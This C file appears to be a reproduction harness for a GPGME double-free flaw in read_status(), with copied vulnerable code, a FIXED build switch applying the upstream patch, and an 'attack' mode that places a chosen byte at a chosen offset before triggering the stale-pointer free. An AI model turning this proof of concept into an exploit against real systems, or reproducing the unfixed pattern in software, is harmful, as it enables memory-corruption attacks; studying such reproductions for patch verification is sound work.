/* GPGME CVE-2026-129975: realloc in read_status() is not written back to
 * gpg->status before a callback-error early return; gpg_release() then frees
 * the stale (already reallocated) pointer.  Key statements are verbatim from
 * pinned/engine-gpg.c (gpgme-2.2.0): read_status :1481-1612 and cleanup
 * :601-602.  FIXED adds the two assignments from fix.patch :1494-1501 and
 * removes the end-of-function writeback (:1608-1610), exactly upstream.
 * Stand-ins: _gpgme_io_read (prefilled line), status callback, struct fields.
 */
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
  size_t bufsize;
  char *buffer;
  size_t readpos;
  int eof;
  int (*fnc)(void *, int, char *);
  void *fnc_value;
} status_t;

typedef struct gpg {
  status_t status;
  status_t colon;
} gpg_t;

static int callback_fails;
static unsigned char chosen_byte;
static size_t chosen_offset;

/* Stand-in for the status-line consumer; returns the error that triggers the
 * real early return in read_status().  It also exposes the bytes supplied by
 * the "wire" (here a prefilled status line) at a chosen buffer offset. */
static int status_fnc(void *value, int code, char *rest)
{
  (void)value;
  fprintf(stderr, "status code=%d byte[%zu]=0x%02x\n", code, chosen_offset,
          (unsigned char)rest[chosen_offset]);
  return callback_fails ? -1 : 0;
}

static int read_status(gpg_t *gpg)
{
  char *p;
  int nread;
  size_t bufsize = gpg->status.bufsize;
  char *buffer = gpg->status.buffer;
  size_t readpos = gpg->status.readpos;
  int err;

  assert(buffer);
  if (bufsize - readpos < 256)
    {
      /* Need more room for the read.  */
      bufsize += 1024;
      buffer = realloc (buffer, bufsize);
      if (!buffer)
	return 1;
#ifdef FIXED
      gpg->status.bufsize = bufsize;
      gpg->status.buffer = buffer;
#endif
    }

  /* Stand-in for _gpgme_io_read: the prefilled status line is already there. */
  nread = (int)strlen (buffer + readpos);
  if (nread == -1)
    return 1;

  while (nread > 0)
    {
      for (p = buffer + readpos; nread; nread--, p++)
	{
	  if (*p == '\n')
	    {
	      *p = 0;
	      if (!strncmp (buffer, "[GNUPG:] ", 9)
		  && buffer[9] >= 'A' && buffer[9] <= 'Z')
		{
		  char *rest = strchr (buffer + 9, ' ');
		  if (!rest)
		    rest = p;
		  else
		    *rest++ = 0;
		  err = status_fnc (gpg->status.fnc_value, 42, rest);
		  if (err)
		    return err; /* early return BEFORE writeback (vulnerable) */
		}
	    }
	  else
	    readpos++;
	}
    }

#ifndef FIXED
  /* Update the gpg object.  */
  gpg->status.bufsize = bufsize;
  gpg->status.buffer = buffer;
#endif
  gpg->status.readpos = readpos;
  return 0;
}

/* Verbatim cleanup from pinned/engine-gpg.c :601-602. */
static void release(gpg_t *gpg)
{
  if (gpg->status.buffer)
    free (gpg->status.buffer);
}

int main(int argc, char **argv)
{
  gpg_t gpg;
  char *old;
  int rc;

  if (argc != 4)
    return 2;
  callback_fails = strcmp(argv[1], "attack") == 0;
  chosen_byte = (unsigned char)strtoul(argv[2], NULL, 0);
  chosen_offset = strtoul(argv[3], NULL, 0);
  /* old[14 + offset] must stay inside the 1024-byte setup allocation. */
  if (chosen_offset > 1009)
    return 2;

  memset(&gpg, 0, sizeof(gpg));
  gpg.status.bufsize = 1024;
  gpg.status.readpos = 900;
  gpg.status.buffer = malloc(gpg.status.bufsize);
  if (!gpg.status.buffer)
    return 2;
  memset(gpg.status.buffer, 0x41, 1024);
  old = gpg.status.buffer;
  old[14 + chosen_offset] = (char)chosen_byte;
  strcpy(gpg.status.buffer + 900, "[GNUPG:] GOOD MISHE-OO\n");
  strcpy(gpg.status.buffer, "[GNUPG:] GOOD MISHE-OO\n"); /* cached line at buffer start */
  gpg.status.fnc = status_fnc;

  fprintf(stderr, "old=%p\n", (void *)old);
  rc = read_status(&gpg);
  fprintf(stderr, "read_status rc=%d published=%s\n", rc,
          gpg.status.buffer == old ? "old" : "new");
  release(&gpg); /* double free of old in the vulnerable attack path */
  puts("release done");
  return 0;
}
